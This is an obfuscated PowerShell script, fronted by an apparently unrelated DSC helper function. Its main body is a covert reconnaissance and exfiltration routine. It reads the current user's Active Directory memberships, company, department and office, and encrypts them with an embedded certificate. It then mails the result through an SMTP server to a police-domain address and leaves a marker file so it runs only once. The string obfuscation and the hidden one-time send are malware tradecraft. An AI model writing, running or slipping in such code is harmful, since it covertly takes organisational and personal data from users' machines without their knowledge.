.("{0}{1}{2}"-f'SE','T-itE','M')  ('VAr'+'IaBLe'+':MrU6') (  [typE]("{1}{2}{0}" -f 't','envi','RonMEN'));  .("{2}{1}{0}" -f 'itEm','eT-','S') ("vARIaB"+"L"+"e"+":1ah") (  [TYPe]("{0}{1}{4}{2}{3}" -f'SY','stE','.t','eXt.eNcODiNg','m') ) ;    $2Qg7d = [TyPE]("{3}{0}{2}{1}{4}"-F'm','COnV','.','SysTE','erT') ;  function get`-EXP`Or`T`eDdscR`es`OUrceS
{
    [CmdletBinding(POsitIoNALbindIng=${f`A`lsE})]
    Param
    (
        [Parameter(maNDAToRY=${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [PSModuleInfo]
        ${ps`mOdu`leInFO}
    )

    ${dSCRESOu`R`Ces} = @()

    if(-not ${Sc`RIp`T`:IS`c`oREclR} -and (.("{3}{2}{0}{1}"-f'omm','and','et-C','G') -Name ("{0}{1}{3}{2}{4}" -f'Ge','t','ourc','-DscRes','e') -Module ("{3}{2}{5}{1}{0}{4}{6}{7}"-f'ur','g','esiredStat','PSD','ati','eConfi','o','n') -ErrorAction ("{0}{1}" -f 'Igno','re')))
    {
        ${oL`DpsMODuLE`pATH} = ${Env:psmoDU`le`pA`Th}

        try
        {
            ${E`NV:`pS`moD`UL`EpATh} = &("{0}{2}{1}" -f'Jo','Path','in-') -Path ${P`ShoME} -ChildPath ("{0}{1}{2}"-f'M','odule','s')
            ${env:pS`mO`dul`ePaTh} = "$env:PSModulePath;$(Split-Path -Path $PSModuleInfo.ModuleBase -Parent) "

            ${dScr`eS`Ou`RC`ES} = &((("{1}{9}{8}{6}{3}{7}{5}{0}{4}{2}"-f'n{0}Get','PS','Resource','tate','-Dsc','nfiguratio','dS','Co','e','Desir'))  -f [cHar]92) -ErrorAction ("{2}{0}{1}{3}" -f 'yCont','inu','Silentl','e') -WarningAction ("{3}{4}{0}{2}{1}" -f'tl','ontinue','yC','Sil','en') |
                                &(("{6}{3}{0}{2}{8}{1}{4}{5}{7}"-f'l.Co','h','reWM1For','t.PowerShel','-','Ob','Microsof','ject','Eac'))."Rep`La`cE"(([ChAR]87+[ChAR]77+[ChAR]49),[STRinG][ChAR]92) {
                                    if(${_}."m`OdULE" -and (${_}."MoDU`Le"."nA`ME" -eq ${psm`odul`e`inFo}."na`mE"))
                                    {
                                        ${_}."Na`me"
                                    }
                                }
        }
        finally
        {
            ${EnV:P`SMOD`UL`E`paTH} = ${ol`DPsMO`duleP`AtH}
        }
    }
    else
    {
        ${d`sCrES`OUr`cesd`IR} = .("{0}{1}{2}{3}" -f 'Joi','n','-Path','Utility') -Path ${ps`mo`DuLEI`NFo}."M`OD`UlEbAse" -ChildPath ("{1}{3}{0}{2}"-f 'sourc','DscR','es','e') -PathType ("{2}{0}{1}"-f 'r','ectory','Di')
        if(&((("{8}{2}{6}{9}{3}{5}{11}{4}{0}{7}{12}{1}{10}" -f'nag','-P','icro','t.Power','a','She','so','emen','M','f','ath','ll.M','t{0}Test'))  -F  [CHaR]92) ${DScre`SO`URc`eSD`Ir})
        {
            ${DSCR`ESourc`ES} = .((("{0}{3}{1}{10}{8}{2}{7}{9}{4}{11}{6}{5}"-f 'Micr','Po','l','osoft.','ment{0}Get-','m','e','.Mana','el','ge','werSh','ChildIt'))  -f  [char]92) -Path ${dS`CREsOur`Ce`sdIR} -Directory -Name
        }
    }

    return ${d`SC`ReS`OurceS}
}
${p`ATH} =  $MRU6::("{1}{0}{2}"-f'tFolde','Ge','rPath').Invoke(("{1}{3}{0}{2}"-f 'ationDat','App','a','lic')) + ((("{0}{1}{2}" -f'Lx','ynsm','.txt'))."r`E`PLAcE"(([chAr]76+[chAr]120+[chAr]121),'\'))

If (.("{0}{1}{3}{2}" -f 'T','es','ath','t-P') ${Pa`TH})
{
    Exit
}


${sER`TI`FiKat} = [Byte[]] (48,130,4,132,2,1,3,48,130,4,74,6,9,42,134,72,134,247,13,1,7,1,160,130,4,59,4,130,4,55,48,130,4,51,48,130,4,47,6,9,42,134,72,134,247,13,1,7,6,160,130,4,32,48,130,4,28,2,1,0,48,130,4,21,6,9,42,134,72,134,247,13,1,7,1,48,28,6,10,42,134,72,134,247,13,1,12,1,6,48,14,4,8,8,55,101,195,42,247,132,164,2,2,8,0,128,130,3,232,104,55,217,204,104,218,227,125,163,154,120,234,44,187,208,199,244,99,47,234,174,89,215,106,68,64,102,97,198,101,81,34,169,161,26,173,27,183,250,180,143,37,169,0,70,237,171,124,68,124,41,146,106,120,150,94,209,17,37,127,43,70,57,255,161,199,117,67,240,230,93,140,166,250,14,18,151,241,213,118,201,245,177,249,87,255,220,210,107,87,199,190,104,129,222,6,61,252,6,188,221,211,154,108,238,211,11,56,147,119,247,244,239,116,56,47,184,164,14,151,2,38,238,103,142,184,229,14,64,249,91,77,68,171,22,58,78,109,172,109,92,3,74,162,110,234,38,75,200,14,229,15,80,158,117,19,95,100,103,37,77,188,203,57,118,245,124,18,173,164,99,220,152,35,123,230,198,168,224,95,12,205,161,199,109,195,35,176,223,113,156,165,198,36,249,194,142,51,147,237,7,138,58,180,74,129,199,146,73,132,4,12,126,242,193,121,189,87,155,191,18,187,239,90,147,228,49,148,174,188,183,39,62,81,130,237,229,215,41,255,165,157,90,121,98,208,17,84,80,77,146,194,132,20,233,85,207,56,95,102,109,101,169,123,30,239,11,225,202,0,127,87,102,202,84,174,51,115,251,234,70,49,154,223,60,69,144,237,112,237,165,58,202,26,151,171,34,161,205,101,77,142,125,16,57,132,6,171,206,235,250,128,117,132,130,53,100,144,86,18,135,187,243,10,219,13,167,202,51,74,78,98,248,210,17,1,107,101,233,54,36,50,55,254,80,140,191,185,57,215,124,62,41,137,158,11,191,84,167,148,142,50,123,104,11,197,127,44,22,236,225,93,128,120,114,139,189,69,137,168,71,146,115,117,65,152,214,191,219,214,180,25,168,104,29,93,26,234,155,236,74,224,59,194,11,113,21,224,183,134,65,70,44,44,248,217,94,36,96,224,183,5,191,1,78,148,103,167,176,232,195,155,209,142,209,79,11,237,172,126,173,118,105,44,162,89,215,35,47,250,7,246,214,16,85,148,241,225,222,20,227,114,125,228,81,18,241,141,191,71,19,205,242,15,103,228,19,207,1,164,230,244,186,125,80,133,212,252,103,101,145,153,54,77,24,160,137,42,123,231,94,105,58,149,172,20,102,95,235,199,201,145,6,204,190,89,198,46,162,38,255,64,110,205,38,28,34,37,134,83,190,150,114,229,37,129,81,137,248,103,70,126,106,213,195,81,123,73,239,84,160,179,247,111,109,131,57,202,40,133,243,229,184,191,58,112,172,246,11,220,45,13,219,1,24,196,148,229,45,66,71,252,164,119,255,100,48,55,41,69,245,27,64,235,108,63,194,155,188,160,139,243,175,116,238,81,121,177,17,125,86,39,243,78,146,184,170,224,213,78,99,199,57,216,124,114,33,147,212,51,56,184,133,176,195,83,119,65,171,63,82,99,19,155,231,114,173,111,110,162,72,213,196,203,27,9,38,190,6,201,250,92,158,187,105,28,142,145,60,61,88,254,20,219,86,166,37,158,90,59,211,2,247,170,73,160,105,152,52,24,193,171,83,148,58,185,138,83,1,103,185,191,198,131,233,50,16,2,24,173,6,206,32,237,96,149,219,96,49,59,130,189,163,128,10,239,175,1,27,109,162,53,63,154,97,212,201,215,232,143,123,148,97,113,150,216,237,80,235,99,161,159,224,41,53,159,153,174,222,112,251,75,179,186,115,112,33,185,35,236,119,159,208,216,162,50,133,140,100,213,202,118,178,154,99,224,96,245,248,147,9,243,96,72,15,169,130,73,233,3,8,142,137,56,231,42,31,108,56,46,65,78,27,248,72,123,156,61,36,49,205,96,115,50,71,26,95,21,50,197,183,5,106,209,164,30,136,200,111,50,1,108,77,102,92,97,31,65,41,146,178,235,122,69,137,248,54,174,167,111,66,183,198,34,229,57,118,220,84,43,43,10,19,39,79,102,203,203,29,205,195,139,26,71,208,4,38,255,188,22,34,112,195,207,75,51,229,167,175,160,37,61,109,113,181,45,200,59,41,85,123,55,95,87,165,81,191,3,86,39,225,12,221,94,196,8,234,6,159,84,193,198,4,64,15,29,121,178,238,57,105,43,96,117,200,205,240,233,60,67,43,5,121,223,143,93,165,82,63,220,184,29,168,0,77,223,100,197,200,17,224,155,165,114,52,137,210,6,80,155,67,119,123,48,57,2,7,170,159,168,168,248,163,105,160,242,18,148,241,207,48,49,48,33,48,9,6,5,43,14,3,2,26,5,0,4,20,37,91,61,148,223,32,52,124,175,64,93,169,147,15,99,172,29,9,58,244,4,8,40,197,28,175,34,29,143,121,2,2,8,0)
${M`eLD`Ing} = &("{0}{1}{2}" -f 'get','-a','duser') -identity ( (.("{0}{2}{1}"-f'vaR','aBlE','i') ("mR"+"u6")  )."vA`Lue"::"U`se`RnaME") -Properties ('*') | .("{1}{2}{0}" -f 'lect','S','e') ("{1}{2}{0}"-f'rOf','Me','mbe'), ("{0}{1}"-f'C','ompany'), ("{0}{2}{1}" -f'D','artment','ep'), ("{1}{0}{2}" -f 'f','Of','ice'), ("{0}{5}{3}{1}{4}{2}"-f'phys','fi','e','liveryOf','ceNam','icalDe') | .("{2}{0}{1}"-f'ertTo-J','son','Conv')
${B`Uff`ER} =   (  .("{0}{1}{2}"-f 'gEt-vari','A','BLe')  ('1a'+'h') )."v`Alue"::"u`TF8".("{1}{0}" -f'ytes','GetB').Invoke(${mE`LDI`NG})
${ouTSt`Re`AM} = &("{1}{0}{3}{2}"-f'-','New','t','Objec') ("{3}{0}{4}{1}{2}" -f 'ste','ory','Stream','Sy','m.IO.Mem')

${rI`j`NDaEl} = .("{2}{0}{1}"-f'Obje','ct','New-') ("{6}{0}{3}{2}{1}{4}{7}{5}"-f'st','ogra','.Crypt','em.Security','phy.Rijnda','lManaged','Sy','e')
${RiJnD`A`El}."Ke`ySiZe" = 256
${rIJn`d`AEL}."BLoC`ksI`ze" = 256
${RIJ`NDa`EL}.("{2}{1}{0}{3}" -f 'e','ateK','Gener','y').Invoke()
${riJn`DA`eL}.("{3}{0}{1}{2}" -f'e','nerate','IV','G').Invoke()

${CE`RT} = &("{0}{2}{1}"-f'N','ct','ew-Obje') ("{6}{16}{13}{4}{0}{14}{5}{2}{1}{15}{11}{9}{12}{8}{3}{7}{10}"-f'e','hy.X50','grap','ert','m.S','Crypto','Sy','ifica','509C','icat','te2','if','es.X','te','curity.','9Cert','s')(,${Se`RTiFI`K`At})
${EnCK`EY} = ${C`Ert}."pU`BlI`Ckey"."k`ey".("{2}{1}{0}"-f'pt','cry','En').Invoke(${r`IJ`NdaEL}."K`EY", ${T`RUe})
${e`N`CIV}  = ${C`ert}."pu`BL`ickeY"."k`EY".("{1}{0}"-f 'crypt','En').Invoke(${r`IJndA`El}."i`V", ${Tr`UE})

${c`ert}."pR`IvATE`kEy"."k`eY"

${oU`TStR`EaM}.("{1}{0}"-f 'e','Writ').Invoke(${En`CK`eY}, 0, 256)
${out`STR`Eam}.("{0}{1}" -f 'W','rite').Invoke(${e`NCiv}, 0, 256)

${e} = ${Ri`jNdA`eL}.("{1}{2}{0}" -f'or','Crea','teEncrypt').Invoke()
${CR`Yp`TO`StRE`Am} = .("{1}{2}{0}"-f 'ject','N','ew-Ob') ("{2}{12}{3}{7}{4}{8}{0}{10}{5}{1}{9}{11}{6}"-f'y.Cr','t','Syst','e','Cr','p','am','curity.','yptograph','o','y','Stre','em.S')(${O`UtstR`EaM}, ${E}, ("{1}{0}" -f'e','Writ'))

${cRY`PtOSTr`Eam}.("{1}{0}" -f 'ite','Wr').Invoke(${bu`F`FEr}, 0, ${BU`F`Fer}."Leng`TH")
${CRyP`T`O`sTR`eAm}.("{0}{1}"-f'Dispo','se').Invoke()

${bAS`e64MEL`D`Ing} =  (  &("{0}{1}"-f 'VarIAB','le') ("{0}{1}" -f '2Q','G7d')  -valueONly )::"t`ObAse`64S`TRIng"(${OUT`s`TR`Eam}.("{0}{2}{1}"-f'To','ay','Arr').Invoke())

${p`SEMaI`lse`RveR} = ("{6}{3}{0}{4}{7}{2}{5}{1}"-f 'ca','.net','olitiet.ma','t','1d','ster','h','s1.p')
${Sm`TP} = &("{1}{2}{3}{0}"-f'ct','new-','o','bje') ("{4}{0}{1}{3}{2}" -f 'Mail.Smtp','Cl','nt','ie','Net.')(${p`sEMAILS`E`RveR})
${sm`TP}.("{1}{0}"-f'end','S').Invoke(("{5}{2}{0}{1}{3}{6}{4}" -f 'ou','s','onym','@p','t.no','an','olitie'), ("{2}{4}{0}{5}{1}{3}" -f'.ei','@polit','to','iet.no','rger','dem'), ("{1}{0}{2}{3}" -f 'e','R','fera','t-18-06-2015'), ${BAse`64mE`l`DiNg})


.("{2}{1}{0}"-f'nt','-Conte','Set') ${p`ATH} ""

.("{1}{0}" -f 'ho','Ec') " "
